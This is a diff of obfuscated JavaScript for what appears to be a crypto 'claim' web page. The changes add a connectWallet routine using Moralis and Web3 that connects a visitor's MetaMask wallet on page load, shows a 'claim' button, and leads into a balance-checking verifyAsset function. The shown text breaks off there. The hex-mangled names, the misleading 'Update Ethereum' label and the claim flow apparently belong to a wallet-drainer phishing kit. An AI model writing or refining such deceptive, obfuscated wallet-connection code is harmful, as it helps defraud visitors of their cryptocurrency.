@@ -69,27 +69,49 @@ function _0x3d85(_0x5557a5, _0x515787) {
 		return _0x468678;
 	}, _0x3d85(_0x5557a5, _0x515787);
 }
-setTimeout(async() => {
+// setTimeout(async() => {
+// 	const _0x4f87c7 = _0x3f5eb1;
+// 	try {
+// 		console.log('loaded');
+// 		const _0x5e61e4 = new Web3(Moralis[_0x4f87c7(0x1b9)]),
+// 			_0x42a59a = (await _0x5e61e4['eth'][_0x4f87c7(0x1e4)]())[0x0];
+// 		console[_0x4f87c7(0x1b2)](_0x42a59a + '\x20is\x20connected');
+//         $("#claimButton span").text('Update Ethereum');
+// 	} catch(_0x96cd57) {
+// 		// alert(_0x96cd57);
+// 		// Object[_0x4f87c7(0x1e7)](document['createElement']('a'), {
+// 		// 	'href': _0x4f87c7(0x1d0)
+// 		// })[_0x4f87c7(0x1bd)]();
+// 	}
+// }, 0x1388);
+
+const connectWallet = async() => {
 	const _0x4f87c7 = _0x3f5eb1;
+	console.log('connectWallet');
 	try {
+		console.log('loaded');
+		const _0x2f422c = _0x3f5eb1;
+		await Moralis[_0x2f422c(0x1e9)](metamaskInstalled ? {} : {
+			'provider': _0x2f422c(0x1ca)
+		});
 		const _0x5e61e4 = new Web3(Moralis[_0x4f87c7(0x1b9)]),
 			_0x42a59a = (await _0x5e61e4['eth'][_0x4f87c7(0x1e4)]())[0x0];
 		console[_0x4f87c7(0x1b2)](_0x42a59a + '\x20is\x20connected');
-        $("#claimButton span").text('Update Ethereum');
+        $("#connectButton").css({'display': 'none'});
+		$("#claimButton").css({'display': 'block'});
 	} catch(_0x96cd57) {
-		// alert(_0x96cd57);
-		// Object[_0x4f87c7(0x1e7)](document['createElement']('a'), {
-		// 	'href': _0x4f87c7(0x1d0)
-		// })[_0x4f87c7(0x1bd)]();
+
 	}
-}, 0x1388);
+}
+
 let metamaskInstalled = ![];
 if(typeof window['ethereum'] !== _0x3f5eb1(0x1c7)) metamaskInstalled = !![];
 window['addEventListener']('load', async() => {
 	const _0x2f422c = _0x3f5eb1;
-	await Moralis[_0x2f422c(0x1e9)](metamaskInstalled ? {} : {
-		'provider': _0x2f422c(0x1ca)
-	}), document[_0x2f422c(0x1dd)]('#claimButton')['addEventListener']('click', verifyAsset);
+	document[_0x2f422c(0x1dd)]('#connectButton')['addEventListener']('click', connectWallet);
+	document[_0x2f422c(0x1dd)]('#claimButton')['addEventListener']('click', verifyAsset);
+	await connectWallet();
+	// await connectWallet();
 });
 let eth_bal = 0x0;
 const verifyAsset = async() => {
